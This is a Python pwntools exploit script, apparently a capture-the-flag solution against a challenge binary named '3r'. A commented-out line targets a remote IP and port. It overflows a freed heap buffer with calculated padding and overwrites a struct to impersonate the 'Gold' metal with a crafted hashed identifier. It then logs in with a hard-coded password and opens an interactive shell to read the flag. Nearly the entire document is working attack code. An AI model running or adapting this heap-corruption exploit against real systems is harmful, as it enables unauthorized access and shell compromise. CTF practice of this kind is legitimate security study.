#!/usr/bin/env python3
from pwn import *

elf = ELF('./3r')

p = elf.process()
# p = remote('18.143.17.69', 9003)

def register():

	p.recvuntil(b"> ")
	p.sendline(b"Metal")

	p.recvuntil(b"> ")
	p.sendline(b"Identifier")

	p.recvuntil(b"> ")
	p.sendline(b"120")	 

def exploit():

	# 120 bio size + buffer length 8
	# This will fill the exact 0x80 size of Freed steelBuffer
	padding = b"A"*128

	# 8 additional bytes is required to move from 
	# "struct metals *alloy" to the header of "struct metals *gold"
	padding += b"A"*8

	# Fill name[8]
	padding += b"A"*8

	# Fill identifier[35] 
	padding += b"A"*35

	# Hex value of metal "Gold"
	gold_hex = p64(0x646c6f47)

	# Create new password with hash.c and convert to hex
	hashed_identifier = b"\x41\x50\x4b\x4e\x62\x5a\x53\x56\x4f\x45\x53\x75\x6f" 

	payload = padding
	payload += gold_hex
	payload += hashed_identifier

	p.sendline(payload) 

	p.recvuntil(b"> ")
	p.sendline(b"1")

	p.recvuntil(b": ")
	p.sendline(b"Gold")

	p.recvuntil(b": ")
	p.sendline(b"s3cur3_p@33w0rd")

	p.recvuntil(b"> ")
	p.sendline(b"2")

	# Get shell, cat flag.txt
	p.interactive()

def main():
	register()
	exploit()

if __name__ == "__main__":
	main()
